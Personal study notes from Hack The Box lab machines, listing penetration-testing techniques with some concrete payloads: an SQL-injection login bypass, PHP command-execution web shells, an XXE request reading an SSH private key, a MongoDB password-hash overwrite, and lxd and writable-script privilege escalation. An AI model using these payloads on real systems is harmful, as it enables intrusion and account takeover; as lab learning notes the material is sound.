# Telnet --> remote management

# FTP --> file sharing
## connecting to ftp
## getting files
## anonymous logon

# SMB --> file sharing
## smbclient
### anonymous logon
### listing shares
### getting files

# network communication model (client-server architechture)

# SSH and public-key cryptography
# RDP
## using default admin account based on OS
### Windows: Administrator
### Linux: root

# directory enumeration
# extension enumeration
# admin pages
# default admin credentials (admin/admin)

# PII

# sql injection for authentication bypass using `' or 1=1 -- -` and any password

# using `mysql` command to login as root without a password
## using databases enumeration commands:
1. `show databases;`
2. `use <DBNAME>;`
3. `show tables;`
4. `select * from <TABLENAME>;`


# status codes for responses to client requests and showing errors

# curl verbose usage and parameters

# virtual hosts

# guessing common passwords

# avoiding locking login interfaces by brute force attacks

# hydra http-post bruteforce

# smb command execution with impacket

# using cookie tampering to bypass authentication

# using wfuzz to fuzz cookie values

# uploading a php reverse shell

# looting `/var/www/html` directory

# using creds to pivot as another user

# finding SUID binary using `find / -type f -perm /4000 2>/dev/null | xargs ls -l`

# jenkins exploitaiton using weak credentials
# finding out MSF brute force module wasn't working
# using `/script` for silent code execution and using the `Groovy` lanuage payload to execute a reverse shell

# impacket mssqlclient.py usage (note using the `-windows-auth` flag)
`python3 mssqlclient.py -windows-auth ARCHETYPE/sql_svc@10.129.83.40`

# finding passwords in `.DTSCONFIG` file:
*frome fileinfo.com:*
A DTSCONFIG file is an XML configuration file used to apply property values to SQL Server Integration Services (SSIS) packages. The file contains one or more package configurations that consist of metadata such as the server name, database names, and other connection properties to configure SSIS packages.

# enabling `xp_cmdshell`
# download a nishang reverse shell and executing it

# using winpeas
# enumerating console history

# using impacket's `psexec.py` for remote code execution

# cracking md5 hash
# cracking zip file password using `zip2john`

# SQLmap sql injection with the `--os-shell` switch and using authenticated cookie

# bash reverse shell

# rummaging through `/var/www/html` for passwords

# find postgresql hash in `pg_authid` which we *couldn't* crack :/

# finding `postgresql` password :D

# sudo vi there
## Gtfo bins
1. `/usr/bin/vi`
2. `:set shell=/bin/bash`
3. `:shell`

----------------------------------------------------------------------

# Machine: unified
# version enumeration
# log4j exploitation
# non default mongodb port
# mongo DB name ... we used the `mongo` command to connect and found the `ace` db.
# we used basic syntax to enumerate the `admin` collection *(Note: collections are the table equivalents in other databases)*
## listing databases using `show dbs`
## using a database using `use <db>`
## listing collections using `show collections`
## enumerating elements in a collection using `db.<collection>.find()`

# we identified the x_shadow field as a shadow file hash `sha512crypt $6$, SHA512 (Unix) 2` in hashcat
# *instead of cracking it,* we use the update command to change the hash generated using `mkpasswd -m sha-512 P3@ceW1thHTB` and log in as administrator the unifi network administrator console
```
db.admin.update(
	{
		"_id":ObjectId("61ce278f46e0fb0012d47ee4")
	}
	{
		$set: {
			"x_shadow" : "$6$zyPslwl.HhmblRYH$.39gZbIPfAdOa1IxGeP16F0jarpNztFp5pMyeLAi0HuviqjpQdyd/X7te0Z6fpKNIZ6zP0aBoHriM7yg5OOL60"
		}
	}
)
```
# *after loggin in,* we started **EXPLORING THE APP FUNCTIONALITY** and we find that we can view the root user password in the `device authentication` section under `Settings > Site`

-------------------------------------------------------------------------------------

# Machine: Included

# Initial Access
## UDP port enumeration, we find tftp
## LFI found from the parameter on the page `http://10.129.78.132/?file=home.php`
## using `python 2.7 pip module tftpy` to put file in the default tftp folder `/var/lib/tftpboot` as per documentation: (https://help.ubuntu.com/community/TFTP#:~:text=The%20default%20configuration%20file%20for,%2Fvar%2Flib%2Ftftpboot)
## tftpy syntax:
1. importing module using `import tftpy`
2. establishing client connection using `client = tftpy.TftpClient("<RHOST>",69)`
*noting that: the rhost has to be enclosed in two quotation marks like above, while the port doesn't. Also, the word TftpClient is case-sensitive*
3. uploading files using `client.upload("<FILENAME>","/full/path/to/file", timeout=5)`
## we get no luck in uploading the standard php reverse shell, and no luck with a standard `<?php exec($_REQUEST["cmd"]);?>` payload.
## but `<?php passthru($_REQUEST["cmd"]);?>` works just fine
## we then create a bash reverse shell and upload it to the victim which works

# Privilege Escalation
## we read `.htpasswd` in the webroot and find something interesting `mike:Sheffield19`
## we use `su` to switch to that user and it works
## we use `id` to find his group membership and find that he's a member of the `lxd` group
## we follow standard privesc steps to create a container with the flag `security.privileged=true` so our container interacts with the host as root
## we execute `/bin/sh` as our container and become root!

-------------------------------------------------------------------------------------

# Markup
## we use default credentials `admin` and `password` to login into the web app
## *browsing around the app,* we find a page that lets us request items
## *browsing the source code,* we find a username *daniel*
## finding an XXE vulnerability where the page `process.php` handles the given data as xml
```
POST /process.php HTTP/1.1
Host: 10.129.67.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
Content-Length: 192
Origin: http://10.129.67.129
Connection: close
Referer: http://10.129.67.129/services.php
Cookie: PHPSESSID=5edhv6kgqtq8fnavg0a7gdd2om

<?xml version = "1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///C:/users/daniel/.ssh/id_rsa'>]>
<order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>
```
## *in the above request,* we are posting to /process.php which takes in our xml file. we create an xml entity called `test` and call it from inside the xml as `&test;`
## we use the file read capabiltiy to get the `id_rsa` file in the home folder of the `daniel` user.
## we know this information because the ssh port happened to be open on the machine from our port scan.
## Scenario: if we didn't know the username, we would have bruteforced home directories using a list of common username. that's of course after taking a shot at the administrator's profile first
## *before using the ssh key,* we change its permissions on our system `chmod 600 id_rsa`
## `ssh -i id_rsa daniel@<RHOST>`
## *after logging in,* we find a strange folder `Log-Management` that contained a batch script `job.bat` which seemed to do a routine task of clearing event logs
## we find that we can write to it and we set our own command `net localgroup administrators daniel /add` to run which makes us a local admin user.
## that takes effect after we *relogin* through SSH
## *another way* was to enumerate autologon credentials, this can be using powershell `'DefaultDomainName', 'DefaultUserName', 'DefaultPassword', 'AltDefaultDomainName', 'AltDefaultUserName', 'AltDefaultPassword' | % {Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name $_}`
## they contained the password for the administrator user which we can use to SSH in and gain local admin access.

-------------------------------------------------------------------------------------

# Tasks:
1. configure ftp
2. configure nfs
3. configure mariadb
4. configure nginx
5. configure apache
6. configure CMSs
	1. wordpress
	2. magento
	3. drupal
	4. joomla
+ play around with them:
	1. find config files + check if they contain passwords
7. configure mongodb and play with it

# what i fucking hate about hack the box
1. difficult level. what the fuck is easy????????? according to whom????? mr.robot crew?

# hack the box is about making you learn the technology and what can be done to hack it

# web vulns discussed
1. LFI/RFI
2. SQLi
3. SSTI
4. Cookie Tampering and authentication bypass
5. IDOR for authorization bypass
6. XXE
7. Log4J